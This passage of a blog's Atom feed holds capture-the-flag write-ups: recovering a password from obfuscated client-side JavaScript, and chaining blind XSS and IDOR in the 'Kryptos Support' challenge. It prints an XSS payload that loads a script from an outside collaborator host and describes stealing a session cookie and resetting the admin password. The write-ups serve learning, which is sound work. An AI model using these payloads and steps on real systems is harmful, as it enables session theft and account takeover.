    <span class="kd">var</span> <span class="nx">_0x1041cd</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">ndG2mZu1rgXQs3rn</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">mtq3ntG3mhbOBMXJwa</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">C2L4BMf0Aw9UC2nOyw1WAw9UCW</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">DxnJz3TJBdeZBNrFCZfKm19HDxrOx2i0zf8Xzdm0Fq</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">mtm4DNHuCxPo</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">mJi2mZrrC1zkzgm</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">nZGZnZLdDLnSEe0</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">z2v0rwXLBwvUDej5swq</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">mJmYmtfuzK5Qvui</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">mJe5mdu3meXPzg5eCq</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">u29YCNKSihrOyxqGAxmGBM90ignVCNjLy3qUifrswsbHz2fPBIbYDwDNzxiH</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">odCYyvLdzM9y</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">m1nRB0zdzq</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">CgfZC3DVCMq</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">mJC0odeYBKDZswPs</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">DMfSDwu</span><span class="dl">'</span><span class="p">];</span>
    <span class="nx">a0_0x202b</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">_0x1041cd</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">;</span>
    <span class="k">return</span> <span class="nf">a0_0x202b</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div> <p>The code above is the obfuscated javascript code from the application. While itâ€™s hard to read the code, but we can guess the potential variable name and the login flow on this application.</p> <p>See the red square in the picture below, itâ€™s the potential logic to check the login flow.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/uscybergames/cyber-2.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <hr/> <h2 id="solution">Solution</h2> <p>Set a breakpoint on the potential logic above, and <code class="language-plaintext highlighter-rouge">watch</code> the <code class="language-plaintext highlighter-rouge">_0x316b93</code>, <code class="language-plaintext highlighter-rouge">_0x3199d5</code> variable.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/uscybergames/cyber-5.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>We found the potential password is <code class="language-plaintext highlighter-rouge">sixnationschampions</code>.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/uscybergames/cyber-4.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>we can control the logic to show the potential flag, by double clicking on the <code class="language-plaintext highlighter-rouge">alert(_0x3199d5(0x16b))</code>.</p> <p>flag: <code class="language-plaintext highlighter-rouge">uscg{cl13nt_51d3_15_4_b4d_1d34}</code></p> <hr/>]]></content><author><name>Dwiki Kusuma</name></author><category term="write-ups"/><category term="ctf"/><summary type="html"><![CDATA[Writeup for The Try Zone Challenge USCyberGames]]></summary></entry><entry><title type="html">Web - Kryptos Support Writeup</title><link href="https://qlkwej.github.io/blog/2022/web-kryptos-support/" rel="alternate" type="text/html" title="Web - Kryptos Support Writeup"/><published>2022-05-15T11:09:00+07:00</published><updated>2022-05-15T11:09:00+07:00</updated><id>https://qlkwej.github.io/blog/2022/web-kryptos-support</id><content type="html" xml:base="https://qlkwej.github.io/blog/2022/web-kryptos-support/"><![CDATA[<details><summary>Disclaimer</summary> <p>I am not a CTF addict nor maniac, I do CTF for fun and learning purpose. So, if you are looking for a writeup that is very detailed and easy to understand, I suggest you to find another writeup.</p> <p>This writeup is just a note for myself and maybe for someone who is looking for a hint to solve the challenge. Feedback / comments / PRs are welcome :)</p> </details> <h2 id="tldr">TL;DR</h2> <p>This writeup is about Kryptos Support challenge from Cyber Apocalypse CTF 2022 - Intergalactic Chase. To get the flag we need to chain a blind XSS and IDOR vulnerability.</p> <h2 id="challenge-description">Challenge Description</h2> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-1.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Upon checking the challenge description, we are given a short description about the challenge.</p> <blockquote> <p>The secret vault used by the longhirâ€™s planet council, Kryptos, contains some very sensitive state secret that Virgil adn Ramona are after to prove injustice performed by the commision. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can inflitrate this system?</p> </blockquote> <p>Let start the challenge by visiting the given link.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-2.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <hr/> <h2 id="problem">Problem</h2> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-3.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The application is a reporting website that allows user to report a problem. There is a keyword <code class="language-plaintext highlighter-rouge">an admin will review your ticket shortly</code>. So, I assume there is a cronjob that run behind the scene to check the ticket and send the report to the admin.</p> <hr/> <h2 id="attack-vectors">Attack vectors</h2> <p>Letâ€™s do basic recon to get more information about the application. I use gobuster<d-footnote>https://github.com/OJ/gobuster</d-footnote> for this purpuse and found several directory, such as:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- admin
- logout
- login
- static
- settings
- tickets
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-5.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>So we have two piece of puzzle as a <code class="language-plaintext highlighter-rouge">hints</code>, which was:</p> <ol> <li>The admin will review the ticket shortly.</li> <li>The mentioned page / directory above.</li> </ol> <p>The best case scenario is the admin will review the ticket (which contaions blind XSS or CSRF vulnerability) and login to the application. So, we can login to the dashboard (maybe). But the question is, where is the starting point?</p> <h3 id="checking-the-ticket-creating-process">Checking the ticket creating process</h3> <p>Letâ€™s create a ticket and see what happen behind the scene. I use burp suite to intercept the request and send it to repeater.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-4.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The request is a POST request with a JSON body to <code class="language-plaintext highlighter-rouge">POST /api/tickets/add</code>. The body contains a <code class="language-plaintext highlighter-rouge">message</code> of the ticket, and it returns a response which indicates the admin will review our message shortly.</p> <p>Okay, this is maybe the starting point. Letâ€™s try to inject a XSS payload to the message and see what happen.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-8.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>I use a vanilla javascript payload with the burpsuite collabolator URL as the endpoint. The payload is <code class="language-plaintext highlighter-rouge">"&gt;&lt;script src="https://collabolator/test.js"&gt;&lt;/script&gt;</code>.</p> <p>I receive a DNS and HTTP request from the application server to the collabolator server. So, the application is vulnerable to blind XSS.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-7.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The next step is to steal the cookie if itâ€™s using a cookie based authentication using XMLHttpRequest <d-footnote>https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials</d-footnote>.</p> <p>I create a dummy server using ngrok <d-footnote>https://ngrok.com/</d-footnote> to host the javascript exploit and use it to receive the request from the application server.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-10.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>I receive a request from the application server and it contains a cookie. So, the application is using a cookie based authentication. Because if itâ€™s using a header based authentication, the exploit wonâ€™t work.</p> <hr/> <h2 id="solution">Solution</h2> <p>Checking the session cookie format, it is a JWT token. So, we can decode the token and see what is inside the token.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-11.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Based on the <code class="language-plaintext highlighter-rouge">payload data</code> it is the <code class="language-plaintext highlighter-rouge">moderator</code> session. But why not <code class="language-plaintext highlighter-rouge">admin</code> ? Perhaps there still one missing piece, but will keep it for observation later.</p> <p>Use the session cookie from the previous step to login to the application. I use the <code class="language-plaintext highlighter-rouge">Cookie Editor</code> extension <d-footnote> https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/ </d-footnote>for firefox to change the cookie value.</p> <p>I can login to the application and see the dashboard. But, there is no flag in the dashboard. So, I assume the flag is in the admin dashboard. I check all the feature in <code class="language-plaintext highlighter-rouge">moderator</code> dashboard and found a <code class="language-plaintext highlighter-rouge">change password</code> feature which is vulnerable to IDOR.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-12.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-13.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>When I put the new password, it will send a POST request to <code class="language-plaintext highlighter-rouge">POST /api/users/update</code> with a JSON body. The body contains a <code class="language-plaintext highlighter-rouge">password</code> and <code class="language-plaintext highlighter-rouge">uid</code> field. The IDOR vulnearbility was in <code class="language-plaintext highlighter-rouge">uid</code>. IF we can change the <code class="language-plaintext highlighter-rouge">uid</code> value to the <code class="language-plaintext highlighter-rouge">uid</code> own by the <code class="language-plaintext highlighter-rouge">admin</code> we can change the admin password. Since itâ€™s a increamental number, so we can bruteforce it from 001-999 <em>(the current user is moderator with <code class="language-plaintext highlighter-rouge">uid</code> 100 so admin must be between that range)</em>.</p> <p>After several iteration, we found the admin <code class="language-plaintext highlighter-rouge">uid</code> it is <code class="language-plaintext highlighter-rouge">uid: 001</code></p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-14.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Change the admin password on the <code class="language-plaintext highlighter-rouge">change password</code> feature and login to the admin dashboard. The flag is in the admin dashboard.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-15.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>flag: <code class="language-plaintext highlighter-rouge">HTB{x55_4nd_id0rs_ar3_fun!!}</code></p> <hr/> <h2 id="lesson-learned">Lesson Learned</h2> <p>I learn several things from this challenge:</p> <h3 id="login-using-default-password">Login using default password</h3> <p>The easiest way to login to the application is to use the default password. I try to use <code class="language-plaintext highlighter-rouge">admin:admin</code> but it wonâ€™t work. But, itâ€™s not a bad idea to try the default password first, because in realworld this scenario is still happen.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-6.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <h3 id="bypass-client-side-validation">Bypass client-side validation</h3> <p>At first, I check the client-side login validation. Whether it using a weak validation and I can bypass the flow. But, turns out itâ€™s a rabbit hole. Itâ€™s only give us information if the login were successfull, it will redirected to <code class="language-plaintext highlighter-rouge">/tickets</code> page</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/cyber-apocalypse-ctf-2022/kryptos-9.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div>]]></content><author><name>Dwiki Kusuma</name></author><category term="write-ups"/><category term="ctf"/><summary type="html"><![CDATA[Writeup for Kryptos Support Challenge. Cyber Apocalypse CTF 2022 - Intergalactic Chase]]></summary></entry><entry><title type="html">Intercept Android SSL Pinning on Flutter Based Android Application</title><link href="https://qlkwej.github.io/blog/2021/intercept-android-ssl-pinning-on-flutter-based-android-application/" rel="alternate" type="text/html" title="Intercept Android SSL Pinning on Flutter Based Android Application"/><published>2021-01-12T05:56:48+07:00</published><updated>2021-01-12T05:56:48+07:00</updated><id>https://qlkwej.github.io/blog/2021/intercept-android-ssl-pinning-on-flutter-based-android-application</id><content type="html" xml:base="https://qlkwej.github.io/blog/2021/intercept-android-ssl-pinning-on-flutter-based-android-application/"><![CDATA[]]></content><author><name></name></author></entry><entry><title type="html">Regression Testing</title><link href="https://qlkwej.github.io/blog/2018/regression-testing/" rel="alternate" type="text/html" title="Regression Testing"/><published>2018-09-20T21:17:01+07:00</published><updated>2018-09-20T21:17:01+07:00</updated><id>https://qlkwej.github.io/blog/2018/regression-testing</id><content type="html" xml:base="https://qlkwej.github.io/blog/2018/regression-testing/"><![CDATA[]]></content><author><name></name></author></entry></feed>